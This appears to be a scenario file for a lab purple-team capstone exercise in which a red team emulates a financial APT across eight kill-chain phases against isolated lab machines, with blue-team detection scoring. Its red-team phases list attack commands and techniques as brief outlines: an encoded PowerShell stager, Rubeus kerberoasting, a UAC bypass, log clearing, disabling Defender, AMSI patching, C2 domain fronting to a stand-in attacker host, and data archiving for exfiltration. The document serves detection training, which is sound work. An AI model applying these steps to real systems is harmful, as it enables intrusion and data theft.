# Day 21 — SCENARIO.md
## Week 3 Capstone: Full Purple Team APT Lifecycle Engagement
**NovaCrest Capital Group | Week 3 Capstone**
**Classification:** TLP:AMBER — Authorized Engagement Participants Only
**Track:** Full Stack Purple Team
**Tools:** Cobalt Strike · Elastic SIEM · ATT&CK Navigator · All Purple Skills

---

## Engagement Overview

Day 21 is the Week 3 capstone: a single coordinated full-stack purple team
engagement that compresses the complete APT lifecycle — recon, initial access,
privilege escalation, lateral movement, C2 establishment, and data exfiltration
staging — into one 6-hour exercise window. Both teams operate simultaneously
with a live detection metrics dashboard. The purple team facilitates, tracks
MTTD per phase, and runs the post-exercise joint kill chain review.

Everything built in Days 15–20 is applied here. This is the stress test.

---

## Threat Actor Emulation Profile

**Emulated Actor:** FIN-NC-001 (composite profile based on FIN7, FIN11, UNC2628)

```
Motivation:      Financial — trading data theft, market manipulation
Sophistication:  High (living-off-the-land; custom C2; domain fronting)
Targeting:       Investment management firms; financial sector
TTPs:
  - Spearphishing with macro-enabled documents (Day 16 technique)
  - Privilege escalation via token impersonation + UAC bypass (Day 17)
  - Kerberoasting for lateral movement credential access (Day 17)
  - Sliver C2 with domain fronting + sleep jitter (Day 20)
  - Data staging + HTTPS exfiltration (Day 18)
Prior Actions:   Confirmed initial access on WS-FIN-04 (per Days 15–20)
Day 21 Goal:     Complete the kill chain; achieve persistence on DC
```

---

## Exercise Parameters

| Parameter | Value |
|-----------|-------|
| Exercise window | 09:00–15:00 UTC (6 hours) |
| Red team SLA | Execute each phase within 45-minute windows |
| Blue team SLA | Detect each phase within 20 minutes of execution start |
| Detection layers | Elastic SIEM, CrowdStrike EDR, Zeek, Zscaler proxy |
| C2 framework | Sliver (primary), Cobalt Strike (lateral movement) |
| Target environment | Lab VMs: WS-FIN-04, lnx-trade-01, SRV-AD-01 (isolated VLAN) |
| Scoring | 5 pts per phase detected within SLA; 2 pts late; 0 missed |

---

## Full Kill Chain — Phase Schedule

| Phase | Window | ATT&CK Tactic | Techniques |
|-------|--------|---------------|-----------|
| 1 — Reconnaissance | T+0:00–0:30 | Reconnaissance | T1592, T1589, T1593 |
| 2 — Initial Access | T+0:30–1:15 | Initial Access | T1566.001, T1059.001 |
| 3 — Execution & Persistence | T+1:15–2:00 | Execution, Persistence | T1059, T1547.001 |
| 4 — Privilege Escalation | T+2:00–2:45 | Privilege Escalation | T1548.002, T1134.001, T1558.003 |
| 5 — Defense Evasion | T+2:45–3:15 | Defense Evasion | T1070.001, T1562.001, T1036 |
| 6 — Lateral Movement | T+3:15–4:00 | Lateral Movement | T1021.002, T1550.002 |
| 7 — C2 Establishment | T+4:00–4:45 | Command & Control | T1071.001, T1090.004 |
| 8 — Collection & Exfil Staging | T+4:45–5:30 | Collection, Exfiltration | T1560.001, T1041, T1567.002 |
| — Post-Exercise Debrief | T+5:30–6:00 | — | Joint kill chain review |

---

## Red Team — Phase Detail

### Phase 1: Reconnaissance (T+0:00–0:30)
- CT log query: `*.novacrest.com` via crt.sh API
- Shodan search: `org:NovaCrest Capital` (identify exposed ports)
- GitHub scan: `org:novacrest` (confirm credentials from Day 15 still valid)
- LinkedIn employee scrape: confirm j.henderson is still active
- *Detection expectation:* Low (passive; no internal signals)

### Phase 2: Initial Access (T+0:30–1:15)
- Deliver macro-enabled `.docm` to `j.henderson@novacrest.com` via GoPhish
- Document lure: "Q3 Investment Strategy — Please Review"
- Macro executes PowerShell stager: `powershell.exe -enc [b64] → downloads Sliver implant`
- Sliver implant beacons out to `cdn.novacrest-updates.com` (domain fronting via Azure CDN)
- *Detection expectation:* Medium (macro execution in Sysmon; Sliver JA3 in Zeek)

### Phase 3: Execution & Persistence (T+1:15–2:00)
- Sliver: enumerate host (`whoami`, `ifconfig`, `ps`)
- Deploy run key persistence: `HKCU\...\Run\WindowsUpdateSvc`
- Schedule task: `schtasks /create /tn "SysCheck" /tr "..."`
- PowerShell: download additional tooling to `%TEMP%\`
- *Detection expectation:* High (registry writes; scheduled task Event 4698)

### Phase 4: Privilege Escalation (T+2:00–2:45)
- Token impersonation: PrintSpoofer → SYSTEM token
- UAC bypass: fodhelper ms-settings COM hijack → High integrity shell
- Kerberoasting: `Rubeus.exe kerberoast /rc4opsec` → 3 service account TGS
- SeImpersonatePrivilege + named pipe → SYSTEM
- *Detection expectation:* High (Sysmon Events 1/10/13; Security 4672/4769)

### Phase 5: Defense Evasion (T+2:45–3:15)
- Clear Windows Security event log (Event 1102)
- Disable Windows Defender real-time protection via PowerShell
- Rename Rubeus.exe to `svccheck.exe` (masquerading)
- AMSI bypass: patch AMSI in-memory
- *Detection expectation:* Critical (log clearing is self-documenting; Sysmon intact)

### Phase 6: Lateral Movement (T+3:15–4:00)
- Pass-the-Ticket: use Rubeus TGS to authenticate to file server (SRV-FS-01)
- SMB: enumerate shares on SRV-FS-01 (`net view \\SRV-FS-01`)
- WMI exec: `wmic /node:SRV-AD-01 process call create "cmd.exe /c whoami"`
- *Detection expectation:* High (Event 4648/4624 network logon; WMI Event 4688)

### Phase 7: C2 Establishment (T+4:00–4:45)
- Upgrade to Cobalt Strike beacon on SRV-AD-01
- Domain fronting: SNI=`legit.azure-cdn.net`; Host=`cs.attacker-c2.com`
- Sleep 600s / Jitter 35%
- Establish SOCKS proxy for tunneling
- *Detection expectation:* Medium (Cobalt Strike JA3; domain fronting if TLS inspection enabled)

### Phase 8: Collection & Exfil Staging (T+4:45–5:30)
- Collect: `Get-ChildItem C:\Finance\ -Recurse *.xlsx | Compress-Archive`
- Collect: `tar czf /tmp/.cache/trading_data.tar.gz /opt/trading/`
- Stage to SYSTEM temp dir: `%SYSTEMROOT%\Temp\upd_pkg.zip`
- Exfil via HTTPS to Cobalt Strike C2: 85 MB
- S3 upload: `aws s3 cp --acl private` to attacker-controlled bucket
- *Detection expectation:* High (Zeek volumetric; files.log; DLP alert)

---

## Blue Team — Detection Layer Assignments

| Team Member | Layer | Tools |
|-------------|-------|-------|
| Analyst 1 | Endpoint | CrowdStrike Falcon + Sysmon |
| Analyst 2 | Network | Zeek (JA3/JARM + beacon timing) |
| Analyst 3 | Proxy | Zscaler (URL + DLP + TLS inspect) |
| Analyst 4 | SIEM | Elastic SIEM (cross-source correlation) |
| Purple Lead | Dashboard | Real-time MTTD tracker |

---

## Scoring & SLA

| Phase | Max Points | SLA (minutes) | Late Detection |
|-------|-----------|---------------|----------------|
| 1 Recon | 5 | 20 | 2 pts |
| 2 Initial Access | 5 | 20 | 2 pts |
| 3 Execution/Persist | 5 | 20 | 2 pts |
| 4 Privilege Escalation | 5 | 20 | 2 pts |
| 5 Defense Evasion | 5 | 15 | 2 pts |
| 6 Lateral Movement | 5 | 20 | 2 pts |
| 7 C2 | 5 | 20 | 2 pts |
| 8 Exfil Staging | 5 | 20 | 2 pts |
| **TOTAL** | **40 pts** | | |

---

## Deliverables

| File | Description |
|------|-------------|
| `SCENARIO.md` | This document |
| `LAB.md` | Full stack lab setup and exercise run guide |
| `REPORT.md` | Capstone findings and improvement roadmap |
| `scripts/engagement_tracker.py` | Real-time MTTD dashboard + scoring engine |
| `scripts/attck_navigator_exporter.py` | Generate ATT&CK Navigator layer from results |
| `queries/elastic_killchain.eql` | Elastic EQL — full kill chain correlation |
| `queries/splunk_killchain.spl` | Splunk SPL — kill chain dashboard |
| `reports/day21_engagement_report.md` | Full engagement report (primary deliverable) |
| `reports/day21_improvement_roadmap.md` | Prioritized remediation roadmap |
| `artifacts/attck_navigator_layer.json` | ATT&CK Navigator layer (detected/missed) |

---

*Day 21 Scenario | Week 3 Capstone — Full Purple Team APT Lifecycle*
*NovaCrest Capital Group | V. Willis, CISSP*
*github.com/Blaakpearl/Blaakpearl*
